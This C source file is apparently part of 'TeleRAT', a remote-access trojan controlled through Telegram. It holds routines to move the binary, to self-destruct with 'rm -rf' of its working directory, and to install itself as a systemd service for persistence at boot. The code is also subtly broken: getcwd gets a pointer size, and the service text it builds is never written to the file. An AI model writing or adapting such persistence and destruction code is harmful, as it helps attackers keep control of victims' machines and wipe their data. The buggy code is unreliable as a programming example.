#include<stdio.h>
#include<string.h>
#include <unistd.h>
#include<stdlib.h> //atoi
struct cmdinfo{
    char nowPath[1024];
    char pName[250];

    char moveTo[1024];
    char cmd[10000];
};


//get Program Name
void getpName(char *pName){
    unsigned int len = strlen(pName);
    //parse ./move -> /move
    strncpy(pName,pName+1,len-1);
    //add null byte for stop string
    pName[len-1] ='\0';
}

//Get Now file location
void getNowPath(char *nowPath){
    if (getcwd(nowPath, sizeof(nowPath)) == NULL)
       perror("getcwd() error");
}

//parse path to command
struct cmdinfo move(struct cmdinfo cmd){
    //Get now program location
    getNowPath(cmd.nowPath);
    getpName(cmd.pName);
    //parse path to cmd
    sprintf(cmd.cmd,"mv %s%s %s%s",cmd.nowPath,cmd.pName,cmd.moveTo,cmd.pName);
    return cmd;
}

struct cmdinfo boom(struct cmdinfo cmd){
    getNowPath(cmd.nowPath);
    getpName(cmd.pName);
    sprintf(cmd.cmd,"rm -rf %s",cmd.nowPath);
    return cmd;
}

void serviceSetting(struct cmdinfo cmd){
    getNowPath(cmd.nowPath);
    getpName(cmd.pName);
	//Connect path with program	
	sprintf(cmd.cmd,"%s%s",cmd.nowPath,cmd.pName);
	
	//writing in /etc/systemd/system
	FILE *f = fopen("/etc/systemd/system/TeleRAT.service","w");
	if(f == NULL)
	{
	   printf("Error can't open file");
	   exit(1);
	}
    char *text = malloc(sizeof(cmd.cmd));
	
	sprintf(text,"[Unit]\n"
		"Description = TeleRAT Remote Administrator Via Telegram\n\n"
        "[Service]\n"
	    "ExecStart =%s\n\n"
		"[Install]\n"
	    "WantedBy=multi-user.target\n\n",cmd.cmd);
	fprintf(f,"%s",cmd.cmd);
}

int main(int argc , char *argv[]){
    char buf[250];

    struct cmdinfo path;
    strcpy(path.pName,argv[0]);
    // strcpy(path.moveTo,argv[1]);


    // path = move(path);
    // path = boom(path);
    serviceSetting(path); 
//    FILE *fp = popen(path.cmd, "r");
    
//    while (fgets(buf, 200, fp))
//     {
//        printf("%s:",buf);
//        bzero(path.cmd,200);
//        bzero(buf,200); 
//    }


    return 0;
}